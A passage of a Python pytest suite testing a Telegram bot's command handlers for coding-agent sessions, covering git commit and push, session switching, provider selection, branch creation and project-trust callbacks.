    bot = _run_commit_command(router, "/commit git add -u")

    assert router.git.safe_git_commands != []
    assert "nothing to commit" in bot.messages[-1][1]


# ---------------------------------------------------------------------------
# git_commands — handle_push edge cases
# ---------------------------------------------------------------------------


def test_push_sends_usage_when_extra_args_provided(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "s1", "backend", "codex", branch_name="main")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main")
    router.runtime.git = router.git

    update = make_update(text="/push extra")
    bot = FakeBot()
    context = SimpleNamespace(args=["extra"], bot=bot)
    asyncio.run(router.handle_push(update, context))

    assert "Usage" in bot.messages[-1][1]


def test_push_warns_when_branch_cannot_be_determined(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    # session with no branch_name stored
    store.create_session("bot-a", 123, "sess1", "s1", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    # current_branch also returns None
    router.git = FakeGitManager(is_git_repo=True, current_branch=None)
    router.runtime.git = router.git

    bot = _run_push_command(router)

    assert "Could not determine" in bot.messages[-1][1]


# ---------------------------------------------------------------------------
# session_commands — handle_switch
# ---------------------------------------------------------------------------


def _make_switch_router(tmp_path: Path) -> CommandRouter:
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router.runtime.git = router.git
    return router


def test_switch_command_reports_no_sessions_when_empty(tmp_path: Path):
    router = _make_switch_router(tmp_path)
    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_switch(update, context))
    assert "No sessions found" in bot.messages[-1][1]


def test_switch_command_lists_sessions_when_no_arg(tmp_path: Path):
    router = _make_switch_router(tmp_path)
    router.deps.store.create_session("bot-a", 123, "sess-abc", "my-session", "backend", "codex")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_switch(update, context))

    assert "my-session" in bot.messages[-1][1]


def test_switch_command_handles_page_arg(tmp_path: Path):
    router = _make_switch_router(tmp_path)
    router.deps.store.create_session("bot-a", 123, "sess-abc", "my-session", "backend", "codex")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["page", "1"], bot=bot)
    asyncio.run(router.handle_switch(update, context))

    assert "my-session" in bot.messages[-1][1]


def test_switch_command_rejects_non_numeric_page(tmp_path: Path):
    router = _make_switch_router(tmp_path)
    router.deps.store.create_session("bot-a", 123, "sess-abc", "my-session", "backend", "codex")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["page", "abc"], bot=bot)
    asyncio.run(router.handle_switch(update, context))

    assert "Invalid page number" in bot.messages[-1][1]


def test_switch_command_by_session_id_activates_session(tmp_path: Path):
    router = _make_switch_router(tmp_path)
    router.deps.store.create_session("bot-a", 123, "sess-abc", "my-session", "backend", "codex")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess-abc"], bot=bot)
    asyncio.run(router.handle_switch(update, context))

    # Should send a confirmation message
    assert any("my-session" in m[1] or "sess-abc" in m[1] or "Switched" in m[1] for m in bot.messages)


def test_switch_command_reports_not_found_for_unknown_session_id(tmp_path: Path):
    router = _make_switch_router(tmp_path)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess-nonexistent"], bot=bot)
    asyncio.run(router.handle_switch(update, context))

    assert "not found" in bot.messages[-1][1].lower()


def test_switch_command_reports_missing_project_folder(tmp_path: Path):
    backend = (tmp_path / "vanished").resolve()  # intentionally doesn't exist
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess-xyz", "ghost-session", "vanished", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router.runtime.git = router.git

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess-xyz"], bot=bot)
    asyncio.run(router.handle_switch(update, context))

    assert "no longer exists" in bot.messages[-1][1].lower() or "vanished" in bot.messages[-1][1]


# ---------------------------------------------------------------------------
# session_commands — handle_provider
# ---------------------------------------------------------------------------


def test_handle_provider_sends_keyboard_when_no_args(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_provider(update, context))

    # Should have sent a message with a reply_markup keyboard
    assert len(bot.messages) >= 1
    assert bot.messages[-1][3] is not None  # reply_markup present


def test_handle_provider_localizes_prompt_text(tmp_path: Path):
    runner = DummyRunner()
    cfg = AppConfig(**{**make_config(tmp_path).__dict__, "locale": "zh-TW"})
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/provider")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_provider(update, context))

    assert "目前 provider：codex" in bot.messages[-1][1]
    assert "請選擇新 session 使用的 provider。" in bot.messages[-1][1]


def test_handle_provider_sends_usage_when_args_provided(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["codex"], bot=bot)
    asyncio.run(router.handle_provider(update, context))

    assert "Usage" in bot.messages[-1][1]


# ---------------------------------------------------------------------------
# project_commands — handle_project edge cases
# ---------------------------------------------------------------------------


def test_project_command_sends_usage_when_no_args(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_project(update, context))

    assert "Usage" in bot.messages[-1][1]


def test_project_command_rejects_when_path_is_a_file(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    # Create a file (not directory) at the project path
    (tmp_path / "myfile").write_text("x")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["myfile"], bot=bot)
    asyncio.run(router.handle_project(update, context))

    assert "not a directory" in bot.messages[-1][1].lower() or "exists" in bot.messages[-1][1].lower()


# ---------------------------------------------------------------------------
# project_commands — handle_branch edge cases
# ---------------------------------------------------------------------------


def test_branch_command_sends_error_when_no_project_selected(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["new-branch"], bot=bot)
    asyncio.run(router.handle_branch(update, context))

    assert "No project selected" in bot.messages[-1][1] or "project" in bot.messages[-1][1].lower()


def test_branch_command_rejects_wrong_number_of_args(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)
    router.runtime.git = router.git
    # Set the project folder via the store directly
    store.set_current_project_folder(router.deps.bot_id, 123, "backend")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["a", "b", "c"], bot=bot)  # 3 args — wrong
    asyncio.run(router.handle_branch(update, context))

    assert "Usage" in bot.messages[-1][1]


# ---------------------------------------------------------------------------
# trust_project_callback — edge cases
# ---------------------------------------------------------------------------


def test_trust_project_callback_handles_invalid_payload(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    edited = []

    async def fake_answer():
        return None

    async def fake_edit(text, parse_mode=None):
        edited.append(text)

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="trustproject:yes",  # missing folder — only 2 parts
            answer=fake_answer,
            edit_message_text=fake_edit,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_trust_project_callback(update, context))

    assert any("Invalid" in e for e in edited)


def test_trust_project_callback_no_decision_leaves_project_untrusted(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    edited = []

    async def fake_answer():
        return None

    async def fake_edit(text, parse_mode=None):
        edited.append(text)

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="trustproject:no:backend",
            answer=fake_answer,
            edit_message_text=fake_edit,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_trust_project_callback(update, context))

    assert not store.is_project_trusted("backend")
    assert any("untrusted" in e.lower() for e in edited)


# ---------------------------------------------------------------------------
# git_commands.py — additional coverage
# ---------------------------------------------------------------------------


def test_commit_disabled_sends_message(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    # enable_commit_command defaults to False in make_config
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    bot = _run_commit_command(router, "/commit git add -u")

    assert "/commit is disabled" in bot.messages[-1][1]


def test_commit_no_args_sends_usage(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    update = make_update(text="/commit")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_commit(update, context))

    assert "Usage: /commit" in bot.messages[-1][1]


def test_commit_no_valid_git_commands_found(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    # Only non-git segments — no valid git commands
    bot = _run_commit_command(router, "/commit echo hello && ls -la")

    assert "No valid git commit commands were found." in bot.messages[-1][1]


def test_commit_fails_mid_execution_sends_partial_results(tmp_path: Path):
    router, _ = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git status completed."),
                SimpleNamespace(success=False, message="nothing to commit"),
            ],
        ),
    )

    bot = _run_commit_command(router, "/commit git status && git commit -m safe")

    last_msg = bot.messages[-1][1]
    assert "git status" in last_msg
    assert "nothing to commit" in last_msg
    assert len(router.git.safe_git_commands) == 2


def test_push_with_args_sends_usage(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/push origin")
    bot = FakeBot()
    context = SimpleNamespace(args=["origin"], bot=bot)
    asyncio.run(router.handle_push(update, context))

    assert "Usage: /push" in bot.messages[-1][1]


def test_push_no_branch_warns(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    # Session with no branch_name; git also returns None
    store.create_session("bot-a", 123, "sess_pb", "push-nobranch", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch=None)
    router.runtime.git = router.git

    bot = _run_push_command(router)

    assert "Could not determine the branch" in bot.messages[-1][1]


def test_push_callback_unknown_action_returns_silently(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="feature-1")
    router.runtime.git = router.git

    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="push:unknown",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, parse_mode=None):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_push_callback(update, context))

    assert edited == []
    assert bot.messages == []


def test_push_callback_empty_branch_warns(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    # Session with no branch_name; git also returns None
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch=None)
    router.runtime.git = router.git

    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="push:confirm",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, parse_mode=None):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_push_callback(update, context))

    assert any("Could not determine the branch" in e for e in edited)


def test_push_callback_checkout_failure_sends_edit(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-x")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    # current_branch differs from session branch so checkout is attempted
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="main",
        checkout_result=SimpleNamespace(success=False, message="error: pathspec 'feature-x' did not match"),
    )
    router.runtime.git = router.git

    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="push:confirm",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, parse_mode=None):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_push_callback(update, context))

    assert any("Push cancelled" in e for e in edited)
    assert router.git.push_calls == []


# ---------------------------------------------------------------------------
# session_commands.py — additional coverage
# ---------------------------------------------------------------------------


def test_switch_no_sessions_sends_not_found(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "No sessions found." in bot.messages[-1][1]


def test_switch_page_invalid_number_sends_error(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["page", "abc"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "Invalid page number" in bot.messages[-1][1]


def test_switch_invalid_session_id_sends_not_found(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["nonexistent-id"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "Session not found" in bot.messages[-1][1]


def test_provider_with_args_sends_usage(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/provider codex")
    bot = FakeBot()
    context = SimpleNamespace(args=["codex"], bot=bot)

    asyncio.run(router.handle_provider(update, context))

    assert "Usage: /provider" in bot.messages[-1][1]


def test_provider_callback_unavailable_shows_not_found(tmp_path: Path, monkeypatch):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    monkeypatch.setattr("coding_agent_telegram.router.session_commands.shutil.which", lambda _: None)

    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="provider:set:codex",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_provider_callback(update, context))

    assert edited
    assert "not found" in edited[0].lower() or "CLI not found" in edited[0]


def test_provider_callback_available_sets_provider(tmp_path: Path, monkeypatch):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    monkeypatch.setattr("coding_agent_telegram.router.session_commands.shutil.which", lambda _: "/usr/bin/codex")

    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="provider:set:codex",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_provider_callback(update, context))

    assert "codex" in edited[0]
    assert store.get_chat_state("bot-a", 123)["current_provider"] == "codex"


# ---------------------------------------------------------------------------
# project_commands.py — additional coverage
# ---------------------------------------------------------------------------


def test_project_no_args_sends_usage(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert "Usage: /project" in bot.messages[-1][1]


def test_project_path_is_file_sends_error(tmp_path: Path):
    # Create a file where the project folder would go
    file_path = tmp_path / "backend"
    file_path.write_text("not a directory")

    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert "not a directory" in bot.messages[-1][1]


def test_branch_not_git_repo_sends_error(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "not a git repository" in bot.messages[-1][1]


def test_branch_wrong_arg_count_sends_usage(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["a", "b", "c"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "Usage: /branch" in bot.messages[-1][1]


def test_origin_branch_prepare_failure_offers_fallback_prompt(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        default_branch="main",
        local_branches=["main"],
        prepare_from_source_result=SimpleNamespace(
            success=False,
            message="fatal: couldn't find remote ref main",
            current_branch=None,
            default_branch="main",
        ),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["feature-new"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "Choose the branch source:" in bot.messages[-1][1]

    edited = []
    query = SimpleNamespace(
        data="branchsource:origin:main:feature-new",
        answer=None,
        edit_message_text=None,
    )
    callback_update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
    )

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit
    asyncio.run(router.handle_branch_source_callback(callback_update, context))

    assert "fatal: couldn't find remote ref main" in edited[-1][0]
    assert "Do you want to create branch feature-new from one of these branches instead of origin/main?" in edited[-1][0]
    labels = [button.text for row in edited[-1][1].inline_keyboard for button in row]
    assert "local/main" in labels
    assert "origin/main" in labels


def test_local_branch_prepare_failure_still_reports_error(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        default_branch="main",
        local_branches=["main"],
        prepare_from_source_result=SimpleNamespace(
            success=False,
            message="Failed to checkout source branch: main",
            current_branch=None,
            default_branch="main",
        ),
    )

    query = SimpleNamespace(
        data="branchsource:local:main:feature-new",
        answer=None,
        edit_message_text=None,
    )
    callback_update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    edited = []

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_source_callback(callback_update, context))

    assert edited[-1][0] == "Failed to checkout source branch: main"
    assert edited[-1][1] is None


def _make_trust_callback_update(data: str):
    """Build a fake update + edited-list for handle_trust_project_callback."""
    edited = []

    async def fake_answer():
        return None

    async def fake_edit(text):
        edited.append(text)

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data=data,
            answer=fake_answer,
            edit_message_text=fake_edit,
        ),
    )
    return update, edited


def test_trust_project_callback_invalid_payload(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update, edited = _make_trust_callback_update("trustproject:onlytwoparts")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_trust_project_callback(update, context))

    assert "Invalid trust decision." in edited


def test_trust_project_callback_no_leaves_untrusted(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update, edited = _make_trust_callback_update("trustproject:no:backend")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_trust_project_callback(update, context))

    assert any("left untrusted" in e for e in edited)
    assert not store.is_project_trusted("backend")


def test_trust_project_callback_already_trusted(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.trust_project("backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update, edited = _make_trust_callback_update("trustproject:yes:backend")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_trust_project_callback(update, context))

    assert any("already trusted" in e for e in edited)


# ---------------------------------------------------------------------------
# base.py — additional coverage
# ---------------------------------------------------------------------------


def test_handle_unsupported_message_sends_unsupported_text(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_unsupported_message(update, context))

    assert "Unsupported message type" in bot.messages[-1][1]


def test_format_git_response_with_ignored_segments():
    from coding_agent_telegram.router.base import CommandRouterBase

    result = SimpleNamespace(success=True, message="git status completed.", stdout=None, returncode=0)
    output = CommandRouterBase._format_git_response(
        [(["status"], result)],
        ["echo hello", "ls -la"],
    )

    assert "Ignored non-git commands:" in output
    assert "echo hello" in output
    assert "ls -la" in output
